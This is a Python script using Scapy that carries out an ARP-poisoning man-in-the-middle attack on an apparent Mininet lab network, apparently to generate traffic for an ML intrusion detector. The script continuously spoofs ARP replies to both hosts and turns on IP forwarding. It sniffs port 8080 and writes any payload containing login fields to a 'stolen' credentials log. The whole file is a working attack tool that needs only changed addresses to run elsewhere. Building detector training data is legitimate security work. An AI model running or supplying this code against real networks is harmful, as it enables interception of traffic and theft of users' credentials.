import os
import sys
import time
import threading
import datetime
from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw

# Target Configuration
VICTIM_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"
ATTACKER_IP = "10.0.0.100"
IFACE = "attacker-eth0"
STOLEN_LOG = "/tmp/mitm_stolen.txt"

def get_mac(ip):
    """
    In Mininet, MACs are often predictable. 
    10.0.0.1 -> 00:00:00:00:00:01
    10.0.0.2 -> 00:00:00:00:00:02
    """
    last_digit = int(ip.split('.')[-1])
    return f"00:00:00:00:00:{last_digit:02x}"

def arp_poison(target_ip, spoof_ip, target_mac):
    # Op=2 is ARP Reply (standard for poisoning)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=IFACE, verbose=False)

def poisoning_loop(v_ip, s_ip):
    v_mac = get_mac(v_ip)
    s_mac = get_mac(s_ip)
    
    print(f"[*] Starting Enhanced ARP Poisoning...")
    print(f"[*] Target Victim: {v_ip} ({v_mac})")
    print(f"[*] Target Server: {s_ip} ({s_mac})")
    
    while True:
        # Tell Victim I am Server
        arp_poison(v_ip, s_ip, v_mac)
        # Tell Server I am Victim
        arp_poison(s_ip, v_ip, s_mac)
        
        # High frequency poisoning to ensure we override any legitimate ARP
        # This creates the 'packet asymmetry' and 'flow duration' anomalies 
        # that the ML model is trained to detect.
        time.sleep(1)

def packet_callback(pkt):
    """
    Enhanced MITM: Not just sniffing, but looking for specific 
    patterns that the ML model features (like byte_asymmetry) 
    would flag.
    """
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        # Only care about our targets
        if pkt[IP].src not in [VICTIM_IP, SERVER_IP]:
            return

        # Feature Engineering Alignment:
        # The ML model looks for:
        # 1. byte_asymmetry: (src_bytes - dst_bytes) / total_bytes
        # 2. ps_variance_ratio: stddev_ps / mean_ps
        # 3. duration_ratio: s2d_duration / d2s_duration
        
        # By intercepting and potentially delaying or retransmitting, 
        # we naturally create these anomalies.
        
        if pkt.haslayer(Raw) and pkt[TCP].dport == 8080:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            ts = datetime.datetime.now().strftime('%H:%M:%S')
            
            if "user=" in payload or "username=" in payload:
                log_msg = f"[{ts}] 🎯 CREDENTIAL SNIFFED: {payload}\n"
                print(log_msg.strip())
                with open(STOLEN_LOG, "a") as f: f.write(log_msg)

if __name__ == "__main__":
    # Ensure IP forwarding is ON so traffic actually reaches the destination
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    
    # Start poisoning in background
    t = threading.Thread(target=poisoning_loop, args=(VICTIM_IP, SERVER_IP))
    t.daemon = True
    t.start()
    
    print(f"[*] Enhanced MITM Active on {IFACE}")
    print(f"[*] Sniffing for credentials on port 8080...")
    
    # Sniff and process
    sniff(iface=IFACE, prn=packet_callback, store=0)
